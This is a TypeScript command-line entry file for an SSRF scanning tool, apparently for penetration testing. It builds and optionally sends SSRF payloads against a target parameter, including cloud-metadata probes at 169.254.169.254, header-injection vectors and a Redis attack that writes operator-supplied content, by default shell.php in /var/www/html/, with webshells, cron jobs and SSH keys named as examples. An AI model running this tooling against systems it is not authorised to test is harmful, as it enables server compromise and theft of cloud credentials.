import { readFileSync } from "node:fs";
import { generateSsrfPayloadPlan } from "../../../core/engines/ssrf/index.ts";
import {
  type SsrfPayload,
  type ScanState,
  createScanState,
  advanceScanState,
  assessImpact
} from "../../../core/engines/ssrf/decision-trees.ts";
import {
  ContentMatcher,
  NotificationManager,
  SlackNotification,
  DesktopNotification,
  TerminalNotification,
  type ScanResult,
  type ContentMatch
} from "../../../core/engines/ssrf/canary.ts";
import { executeSsrfPlan, type SsrfExecutionOutcome } from "../../../core/engines/ssrf/executor.ts";

export interface ScanOptions {
  canaryUrl?: string;
  max?: number;
  noCloud?: boolean;
  targetUrl?: string;
  testHeaders?: boolean;
  verbose?: boolean;
  timeout?: number;
  /** When true, send the generated plan over HTTP instead of emitting plan-only JSON. */
  execute?: boolean;
  slackWebhook?: string;
  redisAttackerHost?: string;
  redisAttackerPort?: number;
  redisWriteFile?: string;
  redisWriteDir?: string;
  redisWriteFilename?: string;
}

/**
 * Loads caller-supplied Redis write content from an external file.
 * The framework ships no payload templates in source — the operator
 * provides write content (webshell, cron job, SSH key) at scan time.
 */
function loadRedisWritePayloads(options: ScanOptions): Array<{ dir: string; filename: string; content: string }> {
  const writeDir = options.redisWriteDir ?? "/var/www/html/";
  const writeFilename = options.redisWriteFilename ?? "shell.php";

  const filePath = options.redisWriteFile ?? process.env.ENIGMA_REDIS_WRITE_FILE;
  if (!filePath) return [];

  try {
    const content = readFileSync(filePath, "utf8");
    return [{ dir: writeDir, filename: writeFilename, content }];
  } catch (err) {
    console.error(`error: failed to read redis write file "${filePath}": ${(err as Error).message}`);
    return [];
  }
}

export interface ScanResultWithImpact extends SsrfPayload {
  impact?: {
    cvss: { base: number; severity: string; vector: string };
    attackPath: string;
    recommendations: string[];
    confidence: string;
  };
  contentMatches?: ContentMatch[];
}

export function runSsrfScan(
  targetUrl: string,
  parameter: string,
  options: ScanOptions = {}
): ScanResultWithImpact[] {
  if (!targetUrl) throw new TypeError("targetUrl is required");
  if (!parameter) throw new TypeError("parameter is required");

  const redisAttackerHost = options.redisAttackerHost ?? process.env.ENIGMA_ATTACKER_HOST;
  const redisAttackerPort = options.redisAttackerPort ?? Number(process.env.ENIGMA_ATTACKER_PORT ?? "0");

  const redisAttack = redisAttackerHost && redisAttackerPort > 0
    ? {
        attackerHost: redisAttackerHost,
        attackerPort: redisAttackerPort,
        writes: loadRedisWritePayloads(options),
      }
    : undefined;

  let plan = generateSsrfPayloadPlan({
    targetUrl,
    allowedHost: options.targetUrl,
    canaryUrl: options.canaryUrl,
    redisAttack,
    testHeaders: options.testHeaders,
  });

  if (options.noCloud) {
    plan = plan.filter((p) => p.category !== "cloud metadata" && !p.payload.includes("169.254.169.254"));
  }

  if (options.canaryUrl) {
    const canaryPayloads = plan.filter(p => p.category === "canary");
    const otherPayloads = plan.filter(p => p.category !== "canary");
    plan = [...canaryPayloads, ...otherPayloads];
  }

  if (options.max !== undefined) {
    if (isNaN(options.max) || options.max < 0) {
      throw new RangeError("max option must be a non-negative integer");
    }
    plan = plan.slice(0, options.max);
  }

  // Header injection is generated inside generateSsrfPayloadPlan when testHeaders is set.
  // Rebuild plan with the flag so X-Forwarded-*, X-Callback-URL, Referer, etc. are real vectors.

  const results: ScanResultWithImpact[] = plan.map(p => ({ ...p }));

  if (options.verbose) {
    console.error(`[INFO] Generated ${results.length} payloads`);
    console.error(`[INFO] Target: ${targetUrl}`);
    console.error(`[INFO] Parameter: ${parameter}`);
    if (options.targetUrl) {
      console.error(`[INFO] Internal target: ${options.targetUrl}`);
    }
  }

  return results;
}

async function main() {
  const targetUrl = process.argv[2];
  const parameter = process.argv[3];
  if (!targetUrl || !parameter) {
    console.error("usage: enigma-ssrf run <targetUrl> <parameter> [options]");
    console.error("");
    console.error("options:");
    console.error("  --canary=<url>           OOB callback URL");
    console.error("  --max=<n>                Max payloads to test");
    console.error("  --no-cloud               Skip cloud metadata payloads");
    console.error("  --target=<url>           Target internal URL for bypass testing");
    console.error("  --test-headers           Test header injection vectors");
    console.error("  --verbose                Verbose output");
    console.error("  --execute                Send payloads over HTTP (default: plan-only JSON)");
    console.error("  --timeout=<ms>           Timeout per request in ms (default: 5000)");
    console.error("  --slack-webhook=<url>    Slack webhook for notifications");
    console.error("  --redis-host=<host>      Redis attack: attacker host");
    console.error("  --redis-port=<port>      Redis attack: attacker port");
    console.error("  --redis-write-file=<f>   File containing write payload (webshell, etc.)");
    console.error("  --redis-write-dir=<dir>  Target directory for write (default: /var/www/html/)");
    console.error("  --redis-write-name=<fn>  Target filename (default: shell.php)");
    process.exitCode = 1;
    return;
  }

  const options: ScanOptions = {};
  let slackWebhook: string | undefined;

  for (const arg of process.argv.slice(4)) {
    if (arg.startsWith("--canary=")) {
      options.canaryUrl = arg.slice(arg.indexOf("=") + 1);
    } else if (arg.startsWith("--max=")) {
      const val = parseInt(arg.slice(arg.indexOf("=") + 1), 10);
      if (isNaN(val) || val < 0) {
        console.error("error: --max option requires a non-negative integer");
        process.exitCode = 1;
        return;
      }
      options.max = val;
    } else if (arg === "--no-cloud") {
      options.noCloud = true;
    } else if (arg.startsWith("--target=")) {
      options.targetUrl = arg.slice(arg.indexOf("=") + 1);
    } else if (arg === "--test-headers") {
      options.testHeaders = true;
    } else if (arg === "--verbose") {
      options.verbose = true;
    } else if (arg === "--execute") {
      options.execute = true;
    } else if (arg.startsWith("--timeout=")) {
      options.timeout = parseInt(arg.slice(arg.indexOf("=") + 1), 10);
    } else if (arg.startsWith("--slack-webhook=")) {
      slackWebhook = arg.slice(arg.indexOf("=") + 1);
      options.slackWebhook = slackWebhook;
    } else if (arg.startsWith("--redis-host=")) {
      options.redisAttackerHost = arg.slice(arg.indexOf("=") + 1);
    } else if (arg.startsWith("--redis-port=")) {
      options.redisAttackerPort = parseInt(arg.slice(arg.indexOf("=") + 1), 10);
    } else if (arg.startsWith("--redis-write-file=")) {
      options.redisWriteFile = arg.slice(arg.indexOf("=") + 1);
    } else if (arg.startsWith("--redis-write-dir=")) {
      options.redisWriteDir = arg.slice(arg.indexOf("=") + 1);
    } else if (arg.startsWith("--redis-write-name=")) {
      options.redisWriteFilename = arg.slice(arg.indexOf("=") + 1);
    }
  }

  const result = runSsrfScan(targetUrl, parameter, options);

  if (options.execute) {
    const outcome: SsrfExecutionOutcome = await executeSsrfPlan(targetUrl, parameter, result, {
      timeoutMs: options.timeout ?? 5000,
      maxAttempts: options.max,
      slackWebhook: options.slackWebhook,
      verbose: options.verbose
    });
    if (options.verbose) {
      console.error(`[INFO] Executed ${outcome.attempts} payloads. confirmed=${outcome.confirmed} phase=${outcome.phase}`);
    }
    console.log(JSON.stringify(outcome, null, 2));
    process.exitCode = outcome.confirmed > 0 ? 0 : 1;
    return;
  }

  if (options.verbose) {
    console.error(`[INFO] Scan complete. ${result.length} payloads generated.`);
    console.error(`[INFO] Pass --execute to send payloads over HTTP, or integrate with your testing framework.`);
  }

  console.log(JSON.stringify(result));
}

if (import.meta.url === `file://${process.argv[1]}` || process.argv[1]?.endsWith("run.ts")) {
  void main();
}
